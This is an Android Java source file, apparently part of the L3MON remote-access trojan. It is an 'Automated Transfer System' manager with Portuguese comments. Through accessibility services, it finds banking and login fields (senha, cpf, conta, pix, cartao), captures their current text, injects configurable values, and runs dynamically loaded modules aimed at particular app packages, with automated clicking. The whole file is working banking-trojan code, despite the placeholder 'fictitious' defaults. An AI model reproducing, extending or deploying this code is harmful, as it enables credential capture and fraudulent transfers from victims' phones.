package com.etechd.l3mon.managers;

import android.os.Bundle;
import android.view.accessibility.AccessibilityNodeInfo;
import com.etechd.l3mon.managers.LogManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * ATSManager - Gerenciador do Automated Transfer System (0xAT) e SetText (0xST)
 * Responsável por:
 * - Injeção automática de dados fictícios em campos (ATS)
 * - Injeção manual de texto (SetText)
 * - Detecção e preenchimento de campos sensíveis
 */
public class ATSManager {

    private static final String[] ATS_PATTERNS = {

            "email", "phone", "password", "address", "cpf", "creditcard", "cartao",
            "account", "login", "usuario", "user", "cep", "rg", "bank", "conta",
            "senha", "telefone", "endereco", "nome", "titular"
    };

    private static final String[] EDITABLE_FIELD_HINTS = {
            "email", "e-mail", "telefone", "phone", "senha", "password", "cpf", "cartao",
            "conta", "agencia", "usuario", "login", "chave", "pix", "endereco"
    };

    private ATSConfig config = new ATSConfig();
    private final List<com.etechd.l3mon.loader.IATSModule> dynamicModules = new ArrayList<>();

    // ==================== CONFIGURAÇÃO ====================

    public void addDynamicModule(com.etechd.l3mon.loader.IATSModule module) {
        if (module != null) {
            dynamicModules.add(module);
        }
    }

    public void clearDynamicModules() {
        dynamicModules.clear();
    }

    public static class ATSConfig {
        public boolean enabled = true;
        public String email = "usuario.ficticioso@example.com";
        public String phone = "+5511999999999";
        public String password = "SenhaFictica123!";
        public String cpf = "12345678900";
        public String creditCard = "4532015112830366";
        public String address = "Rua Ficticia, 123";
        public String name = "Joao Silva Teste";
        public String bankAccount = "12345678";

        public JSONObject toJson() {
            try {
                JSONObject obj = new JSONObject();
                obj.put("enabled", enabled);
                obj.put("email", email);
                obj.put("phone", phone);
                obj.put("password", password);
                obj.put("cpf", cpf);
                obj.put("creditCard", creditCard);
                obj.put("address", address);
                obj.put("name", name);
                obj.put("bankAccount", bankAccount);
                return obj;
            } catch (Exception e) {
                return new JSONObject();
            }
        }
    }

    public void setConfig(ATSConfig newConfig) {
        this.config = newConfig;
    }

    public ATSConfig getConfig() {
        return config;
    }

    // ==================== SET TEXT (0xST) ====================

    /**
     * Injeta texto em um campo específico pelo viewId
     */
    public boolean setTextByViewId(AccessibilityNodeInfo root, String viewId, String text) {
        if (root == null || viewId == null || text == null)
            return false;

        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        if (nodes == null || nodes.isEmpty())
            return false;

        for (AccessibilityNodeInfo node : nodes) {
            if (node != null && setTextIntoField(node, text)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Injeta texto no primeiro campo editável encontrado
     */
    public boolean setTextInFirstEditable(AccessibilityNodeInfo root, String text) {
        if (root == null || text == null)
            return false;
        return setTextInFirstEditableRecursive(root, text);
    }

    private boolean setTextInFirstEditableRecursive(AccessibilityNodeInfo node, String text) {
        if (node == null)
            return false;

        if (node.isEditable()) {
            return setTextIntoField(node, text);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (setTextInFirstEditableRecursive(child, text)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    /**
     * Injeta o mesmo texto em todos os campos editáveis
     */
    public int setTextInAllEditableFields(AccessibilityNodeInfo root, String text) {
        if (root == null || text == null)
            return 0;
        List<Integer> count = new ArrayList<>();
        count.add(0);
        setTextInAllEditableRecursive(root, text, count);
        return count.get(0);
    }

    private void setTextInAllEditableRecursive(AccessibilityNodeInfo node, String text, List<Integer> count) {
        if (node == null)
            return;

        if (node.isEditable()) {
            if (setTextIntoField(node, text)) {
                count.set(0, count.get(0) + 1);
            }
            return;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                setTextInAllEditableRecursive(child, text, count);
                child.recycle();
            }
        }
    }

    // ==================== ATS AUTOMATION (0xAT) ====================

    public void performATSAutomation(AccessibilityNodeInfo root) {

        if (root == null || !config.enabled)
            return;

        // Executar módulos dinâmicos primeiro
        String currentPackage = root.getPackageName() != null ? root.getPackageName().toString() : "";

        for (com.etechd.l3mon.loader.IATSModule module : dynamicModules) {
            try {
                String target = module.getTargetPackage();
                // Executa se o target for null (qualquer app) ou bater com o pacote atual
                if (target == null || target.isEmpty() || target.equals(currentPackage)) {
                    module.execute(root, config);
                }
            } catch (Exception e) {
                android.util.Log.e("ATSManager", "Erro ao executar módulo dinâmico: " + module.getModuleName(), e);
            }
        }

        performATSAutomationRecursive(root);
    }

    private void performATSAutomationRecursive(AccessibilityNodeInfo node) {
        if (node == null)
            return;

        if (node.isEditable()) {
            String combined = getCombinedText(node).toLowerCase();
            for (String pattern : ATS_PATTERNS) {
                if (combined.contains(pattern)) {
                    String fictitiousData = mapPatternToData(pattern);
                    if (fictitiousData != null) {
                        setTextIntoField(node, fictitiousData);

                        // Logging Avançado: Inteligência de Campo
                        try {
                            JSONObject logCtx = new JSONObject();
                            logCtx.put("pattern", pattern);
                            logCtx.put("field_id", node.getViewIdResourceName());
                            LogManager.log(
                                LogManager.CAT_INTELLIGENCE,
                                LogManager.LEVEL_INFO,
                                "ATS_AUTO",
                                "Campo sensível preenchido automaticamente",
                                logCtx
                            );
                        } catch (Exception ignored) {}
                    }

                    return; // Para após preencher o primeiro match
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                performATSAutomationRecursive(child);
                child.recycle();
            }
        }
    }

    /**
     * Executa ATS + AutoClick (usado por 0xAT com action activateWithAutoClick)
     */
    public void performATSAutomationWithAutoClick(AccessibilityNodeInfo root,
            String[] buttonPatterns,
            int clickDelayMs,
            AutoClickCallback callback) {
        if (root == null)
            return;

        performATSAutomation(root);

        // O clique é delegado para GestureManager
        if (callback != null) {
            callback.onATSCompleted(root, buttonPatterns, clickDelayMs);
        }
    }

    public interface AutoClickCallback {
        void onATSCompleted(AccessibilityNodeInfo root, String[] buttonPatterns, int clickDelayMs);
    }

    // ==================== DETECÇÃO DE CAMPOS ====================

    public JSONArray detectSensitiveFields(AccessibilityNodeInfo root) {
        JSONArray fields = new JSONArray();
        if (root == null)
            return fields;

        detectSensitiveFieldsRecursive(root, fields);
        return fields;
    }

    private void detectSensitiveFieldsRecursive(AccessibilityNodeInfo node, JSONArray fields) {
        if (node == null)
            return;

        if (node.isEditable()) {
            String combined = getCombinedText(node).toLowerCase();
            for (String hint : EDITABLE_FIELD_HINTS) {
                if (combined.contains(hint)) {
                    try {
                        JSONObject fieldInfo = new JSONObject();
                        fieldInfo.put("viewId", node.getViewIdResourceName());
                        fieldInfo.put("text", node.getText() != null ? node.getText().toString() : "");
                        fieldInfo.put("hint", hint);
                        fieldInfo.put("isEditable", true);
                        fields.put(fieldInfo);
                    } catch (Exception ignored) {
                    }
                    break;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                detectSensitiveFieldsRecursive(child, fields);
                child.recycle();
            }
        }
    }

    // ==================== HELPERS ====================

    private String mapPatternToData(String pattern) {
        switch (pattern.toLowerCase()) {

            case "email":
            case "e-mail":
                return config.email;
            case "phone":
            case "telefone":
                return config.phone;
            case "password":
            case "senha":
                return config.password;
            case "cpf":
                return config.cpf;
            case "creditcard":
            case "cartao":
                return config.creditCard;
            case "address":
            case "endereco":
                return config.address;
            case "nome":
            case "titular":
                return config.name;
            case "conta":
            case "account":
                return config.bankAccount;
            default:
                return "DADOS_FICTICIOS";
        }
    }

    private boolean setTextIntoField(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null)
            return false;
        Bundle arguments = new Bundle();
        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);

        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
    }

    private String getCombinedText(AccessibilityNodeInfo node) {
        String text = node.getText() != null ? node.getText().toString() : "";
        String desc = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
        String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";

        String hint = node.getHintText() != null ? node.getHintText().toString() : "";
        return text + " " + desc + " " + viewId + " " + hint;
    }

    public JSONObject createResponse(String status, String operation, String message) {
        try {

            JSONObject resp = new JSONObject();
            resp.put("status", status);
            resp.put("operation", operation);
            resp.put("message", message != null ? message : "");
            resp.put("timestamp", System.currentTimeMillis());
            return resp;
        } catch (Exception e) {
            return new JSONObject();
        }
    }
}